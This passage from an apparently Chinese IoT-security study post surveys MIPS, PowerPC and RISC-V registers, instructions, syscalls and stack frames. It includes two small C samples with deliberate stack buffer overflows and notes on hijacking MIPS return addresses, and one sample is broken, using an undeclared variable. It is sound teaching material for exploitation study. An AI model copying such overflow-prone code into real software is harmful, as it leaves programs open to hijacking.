<td>特殊寄存器</td>
<td>HI</td>
<td>乘除结果高位寄存器</td>
</tr>
<tr>
<td>特殊寄存器</td>
<td>LO</td>
<td>乘除结果低位寄存器</td>
</tr>
</tbody></table>
<h3 id="指令集合-2"><a href="#指令集合-2" class="headerlink" title="指令集合"></a>指令集合</h3><table>
<thead>
<tr>
<th>c语言</th>
<th>MIPS名称</th>
<th>大小（字节）</th>
<th>汇编助记符</th>
</tr>
</thead>
<tbody><tr>
<td>char</td>
<td>byte</td>
<td>1</td>
<td>lb中的“b”</td>
</tr>
<tr>
<td>short</td>
<td>halfword</td>
<td>2</td>
<td>lh中的“h”</td>
</tr>
<tr>
<td>int</td>
<td>word</td>
<td>4</td>
<td>lw中的“w”</td>
</tr>
<tr>
<td>long(long long)</td>
<td>dword</td>
<td>8</td>
<td>ld中的“d”</td>
</tr>
</tbody></table>
<ul>
<li><strong>load&#x2F;store</strong></li>
</ul>
<table>
<thead>
<tr>
<th>指令</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>la $t0, val_1</td>
<td>复制val_1表示的地址到t0寄存器中，val_1是个Label</td>
</tr>
<tr>
<td>lw $t2, ($t0)</td>
<td>t0寄存器中的值作为地址，把这个地址起始的Word复制到t2 中</td>
</tr>
<tr>
<td>lw $t2, 4($t0)</td>
<td>t0寄存器中的值作为地址， 把这个地址再加上偏移量4后 所起始的Word 复制到t2中</td>
</tr>
<tr>
<td>sw $t2, ($t0)</td>
<td>把t2寄存器中值（1 Word），存储到t0的值所指向的RAM中</td>
</tr>
<tr>
<td>sw $t2, -12($t0)</td>
<td>把t2寄存器中值（1 Word），存储到t0的值再减去偏移量12, 所指向的RAM 中</td>
</tr>
</tbody></table>
<ul>
<li>算数运算指令</li>
</ul>
<p>算数运算指令的所有操作数都是寄存器，不能直接使用RAM地址或间接寻址，操作数的大小都为 Word （4-Byte）。</p>
<table>
<thead>
<tr>
<th>指令</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>move $t5, $t1</td>
<td>$t5 &#x3D; $t1;</td>
</tr>
<tr>
<td>add $t0, $t1, $t2</td>
<td>$t0 &#x3D; $t1 + $t2; 带符号数相加</td>
</tr>
<tr>
<td>sub $t0, $t1,$t2</td>
<td>$t0 &#x3D; $t1 - $t2; 带符号数相减</td>
</tr>
<tr>
<td>addi $t0, $t1, 5</td>
<td>$t0 &#x3D; $t1 + 5;</td>
</tr>
<tr>
<td>addu $t0, $t1, $t2</td>
<td>$t0 &#x3D; $t1 + $t2; 无符号数相加</td>
</tr>
<tr>
<td>subu $t0, $t1, $t2</td>
<td>$t0 &#x3D; $t1 - $t2; 无符号数相减</td>
</tr>
<tr>
<td>mult $t3, $t4</td>
<td>$t3 * $t4, 把64-Bits 的积，存储到Lo，Hi中。即： (Hi, Lo) &#x3D; $t3 * $t4;</td>
</tr>
<tr>
<td>div $t5, $t6</td>
<td>Lo &#x3D; $t5 &#x2F; $t6 (Lo为商的整数部分); Hi &#x3D; $t5 mod $t6 (Hi为余数)</td>
</tr>
<tr>
<td>mfhi $t0</td>
<td>$t0 &#x3D; Hi</td>
</tr>
<tr>
<td>mflo $t1</td>
<td>$t1 &#x3D; Lo</td>
</tr>
</tbody></table>
<ul>
<li>分支跳转指令</li>
</ul>
<table>
<thead>
<tr>
<th>指令</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>b target</td>
<td>无条件的分支跳转，将跳转到target 标签处</td>
</tr>
<tr>
<td>beq $t0, $t1, target</td>
<td>如果 $t0 &#x3D;&#x3D; $t1, 则跳转到target 标签处</td>
</tr>
<tr>
<td>blt $t0, $t1, target</td>
<td>如果 $t0 &lt; $t1, 则跳转到target 标签处</td>
</tr>
<tr>
<td>ble $t0, $t1, target</td>
<td>如果 $t0 &lt;&#x3D;$t1, 则跳转到target 标签处</td>
</tr>
<tr>
<td>bgt $t0, $t1, target</td>
<td>如果 $t0 &gt; $t1, 则跳转到target 标签处</td>
</tr>
<tr>
<td>bge $t0, $t1, target</td>
<td>如果 $t0 &gt;&#x3D; $t1, 则跳转到target 标签处</td>
</tr>
<tr>
<td>bne $t0, $t1, target</td>
<td>如果 $t0 !&#x3D; $t1, 则跳转到target 标签处</td>
</tr>
</tbody></table>
<ul>
<li>跳转指令</li>
</ul>
<table>
<thead>
<tr>
<th>指令</th>
<th>注释</th>
</tr>
</thead>
<tbody><tr>
<td>j target</td>
<td>无条件的跳转, 将跳转到target标签处</td>
</tr>
<tr>
<td>jr $t3</td>
<td>跳转到t3寄存器所指向的地址处（Jump Register）</td>
</tr>
</tbody></table>
<ul>
<li>子函数调用指令</li>
</ul>
<p><code>jalr sub_routine_label</code> </p>
<p>执行步骤：<br> 　　a. 复制当前的<code>PC</code>到 <code>$ra</code> 寄存器中。 因为当前的 <code>PC</code> 值就是子函数执行完毕后的返回地址。<br> 　　b. 程序跳转到子程序标签 <code>sub_routine_label</code> 处。　　<br> 　　注：子函数的返回，使用 <code>jr $ra</code>　　<br> 　　如果子函数内又调用了其他的子函数，那么 <code>$ra</code> 的值应该被保存到堆栈中。 因为 <code>$ra</code> 的值总是对应着当前执行的子函数的返回地址。</p>
<p><strong>与x86</strong></p>
<p>大多数采用linux嵌入式操作系统的路由器使用的是MIPS32架构，MIPS32架构函数调用时对栈的分配和使用方式与x86架构有异同之处：</p>
<ul>
<li><p>mips32与x86一样，栈是从高地址向低地址增长，但mips进入一个函数时需要将当前栈指针向下移动 n 比特，这个大小为n比特的存储空间就是此函数的 stack frame  的存储区域。此后栈指针便不再移动，只能在函数返回时再将栈指针加上这个偏移量恢复栈现场。由于不能随便移动栈指针，所以寄存器压栈和出栈都必须指定偏移量。</p>
</li>
<li><p>函数A调用函数B，A会在栈顶预留一部分空间来保存被调用者B的参数，即调用参数空间。</p>
</li>
<li><p>调用者将前四个参数保存在寄存器 <code>$a0</code> - <code>$a3</code> 中。如果有更多的参数，或者有传值的结构，将被放在调用参数空间（栈，同x86）。</p>
</li>
<li><p>x86使用call命令调用函数会将当前执行位置压入栈，但mips把函数的返回地址直接存入<code>$RA</code>（Return Adress）寄存器，而不是栈。</p>
</li>
</ul>
<p><strong>叶子函数</strong></p>
<p>不存在返回地址放入堆栈，似乎无法利用</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// subcall_nostack.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">no_stack</span><span class="params">(<span class="type">char</span> *src)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> dst[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; count; i++)</span><br><span class="line">		dst[i] = src[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> count = <span class="built_in">strlen</span>(argv[<span class="number">1</span>]);</span><br><span class="line">	no_stack(argv[<span class="number">1</span>], count);</span><br><span class="line">&#125;</span><br><span class="line">$ mipsel-linux-gcc subcall_nostack.c -<span class="type">static</span> -o subcall_nostack</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/17/IoT%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98/20200330112823.png"
                      alt="img"
                >](<a class="link"   target="_blank" rel="noopener" href="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/20200330112823.png" >https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/20200330112823.png <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)<br>但是堆栈中函数与函数之间的栈帧是相邻的，如果存在大量溢出可以覆盖到初函数的栈帧中存放的返回地址，就可以达到hijack</p>
<p><strong>非叶子函数</strong></p>
<p>有那么一个机会，就是A调用B，B如果还要调用其他函数，就会将A的返回地址存入堆栈，返回A继续执行时，才会将堆栈中的返回地址写入<code>$RA</code>。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// subcall_stack.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">has_stack</span><span class="params">(<span class="type">char</span> *src)</span>        <span class="comment">// 非叶子函数</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> dst[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="built_in">strcpy</span>(dst, src);		<span class="comment">// overflow</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">	has_stack(argv[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line">$ mipsel-linux-gcc subcall_stack.c -<span class="type">static</span> -o subcall_stack</span><br></pre></td></tr></table></figure></div>

<p>编译后拖进ida看看<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/17/IoT%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98/20200329221217.png"
                      alt="img"
                >](<a class="link"   target="_blank" rel="noopener" href="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/20200329221217.png" >https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/20200329221217.png <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)<br>这样一来，如果缓冲区溢出覆盖到了返回地址将其改写为magic，即可被利用。</p>
<h3 id="系统调用-2"><a href="#系统调用-2" class="headerlink" title="系统调用"></a>系统调用</h3><ul>
<li>$V0 保存系统调用号</li>
</ul>
<ul>
<li>参数所使用的寄存器：$a0~$a3</li>
<li>syscall 指令进行系统调用</li>
</ul>
<h3 id="栈帧结构-2"><a href="#栈帧结构-2" class="headerlink" title="栈帧结构"></a>栈帧结构</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/17/IoT%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98/mips.png"
                      alt="mips"
                ></p>
<h2 id="PowerPC"><a href="#PowerPC" class="headerlink" title="PowerPC"></a>PowerPC</h2><p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/binarysystemloophole/articles/10313895.html" >参考链接1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/brucemengbm/p/7103582.html" >参考链接2 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4975?time__1311=n4+xnD0D9DBDcDUxmqhDBqOoimhrpDm2xobD#toc-2" >参考链接3 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="寄存器-3"><a href="#寄存器-3" class="headerlink" title="寄存器"></a>寄存器</h3><ul>
<li>PowerPC（PPC） 使用RISC精简指令集，指令字长都是32bit，4字节对齐。PPC和IA32 CPU的不同点在于其定义了大量的通用寄存器，这个和ARM和X64有点类似。</li>
<li>PowerPC处理器可以运行于两个级别，即用户模式和特权模式。用户模式下，仅有GPR，FPR，CR，FPSCR，LR，CTR，XER以及TBL&#x2F;TBU可以访问。</li>
<li>从Power ISA 2.05开始，DCR寄存器也可以在通过用户模式DCR访问指令进行访问。</li>
</ul>
<table>
<thead>
<tr>
<th>寄存器</th>
<th>名称</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>GPR0-GPR31（共32个寄存器）</td>
<td>通用寄存器</td>
<td>整数运算和寻址通用寄存器.在ABI规范中，GPR1用于堆栈指针，GPR3-GPR4用于函数返回值，GPR3-GPR10用于参数传递</td>
</tr>
<tr>
<td>FPR0-FPR31（共32个寄存器）</td>
<td>浮点寄存器</td>
<td>用于浮点运算。PPC32和PPC64的浮点数都是64位</td>
</tr>
<tr>
<td>LR</td>
<td>链接寄存器</td>
<td>记录转跳地址，常用于记录子程序返回的地址。</td>
</tr>
<tr>
<td>PC</td>
<td>程序计数器</td>
<td>也称AR指令地址寄存器，或者NIP下一条指令指针</td>
</tr>
<tr>
<td>CR</td>
<td>条件寄存器</td>
<td>CR被分为8段，每段四位分别为(LT&#x2F;GT&#x2F;EQ&#x2F;SO), 小于，大于，等于，溢出。</td>
</tr>
<tr>
<td>XER</td>
<td>定点异常寄存器</td>
<td>记录溢出和进位标志，作为CR的补充</td>
</tr>
<tr>
<td>CTR</td>
<td>计数寄存器</td>
<td>用途相当于ECX</td>
</tr>
<tr>
<td>FPSCR</td>
<td>浮点状态和控制寄存器</td>
<td>浮点状态寄存器，用于浮点运算类型的异常记录等，可设置浮点异常捕获掩码</td>
</tr>
<tr>
<td>TBL&#x2F;TBU</td>
<td>时基设施（用于读）</td>
<td></td>
</tr>
</tbody></table>
<ul>
<li>配置寄存器</li>
</ul>
<table>
<thead>
<tr>
<th>配置寄存器</th>
<th align="center">作用</th>
</tr>
</thead>
<tbody><tr>
<td>HID0-HID2</td>
<td align="center">硬件实现寄存器</td>
</tr>
<tr>
<td>MSR</td>
<td align="center">机器状态寄存器（用来配置微处理器的设定）</td>
</tr>
<tr>
<td>MBAR</td>
<td align="center">存储器基址寄存器</td>
</tr>
<tr>
<td>SVR</td>
<td align="center">系统处理器</td>
</tr>
<tr>
<td>PVR</td>
<td align="center">版本寄存器</td>
</tr>
</tbody></table>
<ul>
<li>存储管理寄存器</li>
</ul>
<table>
<thead>
<tr>
<th>存储管理寄存器</th>
<th align="center">作用</th>
</tr>
</thead>
<tbody><tr>
<td>LBATOU&#x2F;LBATOL&#x2F;LBAT3U&#x2F;LBAT3L</td>
<td align="center">指令BAT寄存器</td>
</tr>
<tr>
<td>DBATOU&#x2F;DBATOL&#x2F;DBAT3U&#x2F;DBAT3L</td>
<td align="center">数据BAT寄存器</td>
</tr>
<tr>
<td>DMISS&#x2F;DCMP&#x2F;HASH1&#x2F;HASH2&#x2F;ICMP&#x2F;RPA</td>
<td align="center">软件表搜索寄存器</td>
</tr>
<tr>
<td>SDR1</td>
<td align="center">SDR1</td>
</tr>
<tr>
<td>SR0-SR15</td>
<td align="center">段寄存器</td>
</tr>
<tr>
<td>SPRGs:SPRG0-SPRG7</td>
<td align="center">中断处理寄存器</td>
</tr>
<tr>
<td>DSISR</td>
<td align="center">DSISR</td>
</tr>
<tr>
<td>SRP0 SRP1</td>
<td align="center">保存恢复寄存器</td>
</tr>
<tr>
<td>DEC</td>
<td align="center">多功能寄存器</td>
</tr>
<tr>
<td>CSRR0-CSRR1</td>
<td align="center">紧急中断寄存器</td>
</tr>
<tr>
<td>DAR</td>
<td align="center">数据地址寄存器</td>
</tr>
<tr>
<td>TBL&#x2F;TBU</td>
<td align="center">时基设施（用于写）</td>
</tr>
<tr>
<td>IABR&#x2F;IABR2&#x2F;DABR&#x2F;DABR2</td>
<td align="center">指令&#x2F;数据地址断点寄存器</td>
</tr>
<tr>
<td>IBCR&#x2F;DBCR</td>
<td align="center">指令&#x2F;数据地址断点控制</td>
</tr>
</tbody></table>
<ul>
<li>通用寄存器</li>
</ul>
<table>
<thead>
<tr>
<th>通用寄存器</th>
<th align="center">作用</th>
</tr>
</thead>
<tbody><tr>
<td>r0</td>
<td align="center">在函数开始时使用</td>
</tr>
<tr>
<td>r1(SP)</td>
<td align="center">堆栈指针，相当于ia32架构中的esp寄存器，</td>
</tr>
<tr>
<td>r2(rtoc)</td>
<td align="center">内容表指针，idapro吧这个寄存器反汇编标识为rtoc，系统调用时包含系统调用号</td>
</tr>
<tr>
<td>r3</td>
<td align="center">作为第一个参数和返回值</td>
</tr>
<tr>
<td>r4-r10</td>
<td align="center">函数或系统调用开始的参数</td>
</tr>
<tr>
<td>r11</td>
<td align="center">用在指针的调用或当做一些语言的环境指针</td>
</tr>
<tr>
<td>r12</td>
<td align="center">他用在异常处理个 glink（动态链接器代码）</td>
</tr>
<tr>
<td>r13</td>
<td align="center">保留作为系统线程id</td>
</tr>
<tr>
<td>r14-r31</td>
<td align="center">作为本地变量非易失性</td>
</tr>
</tbody></table>
<ul>
<li>异常处理器</li>
</ul>
<table>
<thead>
<tr>
<th>寄存器</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>SO 总体溢出标志</td>
<td>一旦有溢出位OV置位，SO就会置位。</td>
</tr>
<tr>
<td>OV 溢出标志</td>
<td>当发生溢出时置位，否则清零；在作乘法或除法运算时，如果结果超过寄存器的表达范围，则溢出置位。</td>
</tr>
<tr>
<td>CA 进位标志</td>
<td>当最高位产生进位时，置位，否则清零；扩展精度指令（后述）可以用CA作为操作符参与运算。</td>
</tr>
</tbody></table>
<ul>
<li>机器字长</li>
</ul>
<table>
<thead>
<tr>
<th>PPC</th>
<th>字长（BITS）</th>
<th>简称</th>
<th>IA32</th>
</tr>
</thead>
<tbody><tr>
<td>BYTE</td>
<td>8</td>
<td>B</td>
<td>BYTE</td>
</tr>
<tr>
<td>HALF WORD</td>
<td>16</td>
<td>H</td>
<td>WORD</td>
</tr>
<tr>
<td>WORD</td>
<td>32</td>
<td>W</td>
<td>DWORD</td>
</tr>
<tr>
<td>DWORD</td>
<td>64</td>
<td>D</td>
<td>QWORD</td>
</tr>
</tbody></table>
<blockquote>
<ul>
<li><p>寄存器r1、r14-r31是非易失性的，这意味着它们的值在函数调用过程保持不变。寄存器r2也算非易失性，但是只有在调用函数在调用后必须恢复它的值时才被处理。</p>
</li>
<li><p>寄存器r0、r3-r12和特殊寄存器lr、ctr、xer、fpscr是易失性的，它们的值在函数调用过程中会发生变化。此外寄存器r0、r2、r11和r12可能会被交叉模块调用改变，所以函数在调用的时候不能采用它们的值。</p>
</li>
<li><p>条件代码寄存器字段cr0、cr1、cr5、cr6和cr7是易失性的。cr2、cr3和cr4是非易失性的，函数如果要改变它们必须保存并恢复这些字段。</p>
</li>
</ul>
</blockquote>
<h3 id="指令集合-3"><a href="#指令集合-3" class="headerlink" title="指令集合"></a>指令集合</h3><ul>
<li><p>寄存器表示法<br> 所有计算值的指令均以第一个操作数作为目标寄存器。在所有这些指令中，寄存器都仅用数字指定。例如，将数字 12 载入寄存器的指令是<code>li reg,12</code>。12 表示数字 12，原因在于指令格式(因为<code>li</code>第一个操作数就是寄存器，第2个是立即数)。在某些指令中，GPR0 只是代表数值 0，而不会去查找 GPR0 的内容。</p>
</li>
<li><p>立即指令<br> 以<code>i</code>结束的指令通常是立即指令。<code>li</code> 表示“立即装入”，它是表示“在编译时获取已知的常量值并将它存储到寄存器中”的一种方法。</p>
</li>
<li><p>助记符<br> <code>li</code>实际上不是一条指令，它真正的含义是助记符。 助记符有点象预处理器宏：它是汇编程序接受的但秘密转换成其它指令的一条指令。上面提到的<code>li reg,12</code> 实际上被定义为<code>addi reg,0,12</code> 。</p>
</li>
</ul>
<table>
<thead>
<tr>
<th>指令</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>li REG, VALUE</td>
<td>加载寄存器 REG，数字为 VALUE</td>
</tr>
<tr>
<td>add REGA, REGB, REGC</td>
<td>将 REGB 与 REGC 相加，并将结果存储在 REGA 中</td>
</tr>
<tr>
<td>addi REGA, REGB, VALUE</td>
<td>将数字 VALUE 与 REGB 相加，并将结果存储在 REGA 中</td>
</tr>
<tr>
<td>mr REGA, REGB</td>
<td>将 REGB 中的值复制到 REGA 中</td>
</tr>
<tr>
<td>or REGA, REGB, REGC</td>
<td>对 REGB 和 REGC 执行逻辑 “或” 运算，并将结果存储在 REGA 中</td>
</tr>
<tr>
<td>ori REGA, REGB, VALUE</td>
<td>对 REGB 和 VALUE 执行逻辑 “或” 运算，并将结果存储在 REGA 中</td>
</tr>
<tr>
<td>and, andi, xor, xori, nand, nand, nor</td>
<td>其他所有此类逻辑运算都遵循与 “or” 或 “ori” 相同的模式</td>
</tr>
<tr>
<td>ld REGA, 0(REGB)</td>
<td>使用 REGB 的内容作为要载入 REGA 的值的内存地址</td>
</tr>
<tr>
<td>lbz, lhz, lwz</td>
<td>它们均采用相同的格式，但分别操作字节、半字和字(“z” 表示清除该寄存器中的其他内容)</td>
</tr>
<tr>
<td>b ADDRESS</td>
<td>跳转(或转移)到地址 ADDRESS 处的指令</td>
</tr>
<tr>
<td>bl ADDRESS</td>
<td>对地址 ADDRESS 的子例程调用</td>
</tr>
<tr>
<td>cmpd REGA, REGB</td>
<td>比较 REGA 和 REGB 的内容，并恰当地设置状态寄存器的各位</td>
</tr>
<tr>
<td>beq ADDRESS</td>
<td>若之前比较过的寄存器内容等同，则跳转到 ADDRESS</td>
</tr>
<tr>
<td>bne, blt, bgt, ble, and bge</td>
<td>它们均采用相同的形式，但分别检查不等、小于、大于、小于等于和大于等于</td>
</tr>
<tr>
<td>std REGA, d(REGB)</td>
<td>使用 REGB 的地址+d作为保存 REGA 的值的内存地址</td>
</tr>
<tr>
<td>stb, sth, and stw</td>
<td>它们均采用相同的格式，但分别操作字节、半字和字</td>
</tr>
<tr>
<td>sc</td>
<td>系统调用</td>
</tr>
</tbody></table>
<h3 id="系统调用-3"><a href="#系统调用-3" class="headerlink" title="系统调用"></a>系统调用</h3><ul>
<li><p>系统调用指令 sc</p>
</li>
<li><ul>
<li>指令的使用：</li>
<li><code>r0</code>为syscall调用号</li>
<li><code>r3</code>为参数一</li>
<li><code>r4</code>为参数二</li>
<li><code>r5</code>为参数三</li>
<li>在ppc中syscall使用<code>sc</code></li>
</ul>
<ul>
<li><ul>
<li>sc指令调用操作系统去执行服务程序。当控制返回到一个执行系统调用的程序时，寄存器的内容依赖于程序提供的系统所使用的寄存器的约定。</li>
</ul>
</li>
<li><ul>
<li>跟在sc指令后面的有效指令地址被放在SRR0中。MSR中的位0、5～9和16～31被放在SRR1中对应的位置，SRR1中位1～4和10～15被设置为未定义值。当sc异常产生，异常处理程序更改MSR寄存器。异常处理程序到MSR[IP]形成基址加0xC00偏移量形成的地址去取下一条指令。</li>
</ul>
</li>
<li><ul>
<li>受影响的寄存器有：依赖于系统服务、SRR0、SRR1及MSR。</li>
</ul>
</li>
</ul>
</li>
<li><p>中断返回指令rfi</p>
</li>
<li><ul>
<li>指令操作：</li>
</ul>
<ul>
<li><ul>
<li>MSR[16-23,25-27,30-31] &lt;—SRR1[16-23,25-27,30-31]</li>
</ul>
</li>
<li><ul>
<li>NIA&lt;—iea SRR0[0-29]||0b00</li>
</ul>
</li>
<li><ul>
<li>SRR1中的位0、5～9和16～31被放在MSR中对应的位置。如果新的MSR值没有使能任何未完的操作，则在MSR的控制下，从地址SRR0[0-29]_0b00取下一条指令。</li>
</ul>
</li>
<li><ul>
<li>指令的使用中受影响的寄存器为MSR。</li>
</ul>
</li>
<li><ul>
<li>实际上还有一些特殊的跳转指令rfi&#x2F;rfci&#x2F;rfmci，其目的地址保存在SRR0&#x2F;CSRR0&#x2F;MCSRR0中。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="栈帧结构-3"><a href="#栈帧结构-3" class="headerlink" title="栈帧结构"></a>栈帧结构</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/17/IoT%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98/PPC.png"
                      alt="PPC"
                ></p>
<p><strong>函数参数域（Function Parameter Area）：</strong>这个区域的大小是可选的，即如果如果调用函数传递给被调用函数的参数少于六个时，用GPR4至GPR10这个六个寄存器就可以了，被调用函数的栈帧中就不需要这个区域；但如果传递的参数多于六个时就需要这个区域。</p>
<p><strong>局部变量域（Local Variables Area）：</strong>通上所示，如果临时寄存器的数量不足以提供给被调用函数的临时变量使用时，就会使用这个域。</p>
<p><strong>CR寄存器：</strong>即使修改了CR寄存器的某一个段CRx（x&#x3D;0至7），都有保存这个CR寄存器的内容。</p>
<p><strong>通用寄存器GPR：</strong>当需要保存GPR寄存器中的一个寄存器器GPRn时，就需要把从GPRn到GPR31的值都保存到堆栈帧中。</p>
<p><strong>浮点寄存器FPR：</strong>使用规则共GPR寄存器。</p>
<p>每个Ｃ函数开始几行汇编会为自己建立堆栈帧：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mflr %r0                ;Get Link register</span><br><span class="line">stwu %r1,-88(%r1)       ;Save Back chain and move SP(r1) = r1 – 88</span><br><span class="line">stw %r0,+92(%r1)        ;Save Link register</span><br><span class="line">stmw %r28,+72(%r1)      ;Save 4 non-volatiles r28-r31</span><br></pre></td></tr></table></figure></div>

<p>C函数的结尾几行，会移除建立的堆栈帧，并使得SP（即GPR1）寄存器指向上一个栈帧的栈顶(即栈帧的最低地址处，也就是back chain)</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lwz %r0,+92(%r1)       ;Get saved Link register</span><br><span class="line">mtlr %r0               ;Restore Link register</span><br><span class="line">lmw %r28,+72(%r1)      ;Restore non-volatiles</span><br><span class="line">addi %r1,%r1,88        ;Remove sp frame from stack r1 = r1 + 88</span><br><span class="line">blr                    ;Return to calling function</span><br></pre></td></tr></table></figure></div>

<h2 id="RISC-V"><a href="#RISC-V" class="headerlink" title="RISC-V"></a>RISC-V</h2><h3 id="寄存器-4"><a href="#寄存器-4" class="headerlink" title="寄存器"></a>寄存器</h3><table>
<thead>
<tr>
<th>寄存器</th>
<th>ABI 名称</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>x0</td>
<td>zero</td>
<td>0值寄存器，硬编码为0，写入数据忽略，读取数据为0</td>
</tr>
<tr>
<td>x1</td>
<td>ra</td>
<td>用于返回地址(return address)</td>
</tr>
<tr>
<td>x2</td>
<td>sp</td>
<td>用于栈指针（stack pointer）</td>
</tr>
<tr>
<td>x3</td>
<td>gp</td>
<td>用于通用指针 (global pointer)</td>
</tr>
<tr>
<td>x4</td>
<td>tp</td>
<td>用于线程指针 （thread pointer）</td>
</tr>
<tr>
<td>x5</td>
<td>t0</td>
<td>用于存放临时数据或者备用链接寄存器</td>
</tr>
<tr>
<td>x6~x7</td>
<td>t1~t2</td>
<td>用于存放临时数据寄存器</td>
</tr>
<tr>
<td>x8</td>
<td>s0&#x2F;fp</td>
<td>需要保存的寄存器或者帧指针寄存器</td>
</tr>
<tr>
<td>x9</td>
<td>s1</td>
<td>需要保存的寄存器</td>
</tr>
<tr>
<td>x10~x11</td>
<td>a0~a1</td>
<td>函数传递参数寄存器或者函数返回值寄存器</td>
</tr>
<tr>
<td>x12~x17</td>
<td>a2~a7</td>
<td>函数传递参数寄存器</td>
</tr>
<tr>
<td>x18~x27</td>
<td>s2-s11</td>
<td>需要保存的寄存器</td>
</tr>
<tr>
<td>x28~x31</td>
<td>t3~t6</td>
<td>用于存放临时数据寄存器</td>
</tr>
</tbody></table>
<p>RISC-V有x0~x31共32个通用寄存器，每个通用寄存器都有各自的用途，例如x2是作为sp栈指针、a0~a1用来保存函数参数或返回值。x0寄存器被硬编码为了0，就是个0值寄存器。</p>
<p>ABI名称相当于这些通用寄存器的别名，在RISC-V汇编当中，都使用ABI名称来代表这些寄存器。</p>
<h3 id="指令集合-4"><a href="#指令集合-4" class="headerlink" title="指令集合"></a>指令集合</h3><p>RISC-V指令集由“基本指令集 +  扩展指令集”组成。基本指令集是必选的，扩展指令集是可选的。意思就是可以根据你的实际需求，选择需要使用的指令。例如在一个项目中，如果不需要用到压缩指令，那么就不需要把压缩指令添加进来，从而做到定制化，这也是RISC-V的一大特点。</p>
<p>RISC-V指令集有RV32I、RV32E、RV64I、RV64E、RV64I等等，RV代表RISC-V，32&#x2F;64代表32位或64位，I和E都是基本指令集，在I和E的基础上，可以添加D（双精度浮点扩展）、M（整数乘除法）、A（原子扩展）、C（压缩扩展）等扩展指令。例如，在RV64I基础上，添加原子、整数乘除法、双精度浮点、压缩指令，则该指令集称为RV64IMADC。</p>
<table>
<thead>
<tr>
<th>序号</th>
<th>指令类型</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>R 型指令</td>
<td>用于寄存器和寄存器操作</td>
</tr>
<tr>
<td>2</td>
<td>I 型指令</td>
<td>用于短立即数和内存载入指令load操作</td>
</tr>
<tr>
<td>3</td>
<td>S 型指令</td>
<td>用于内存存储store操作</td>
</tr>
<tr>
<td>4</td>
<td>B 型指令</td>
<td>用于有条件跳转操作</td>
</tr>
<tr>
<td>5</td>
<td>U 型指令</td>
<td>用于长立即数操作</td>
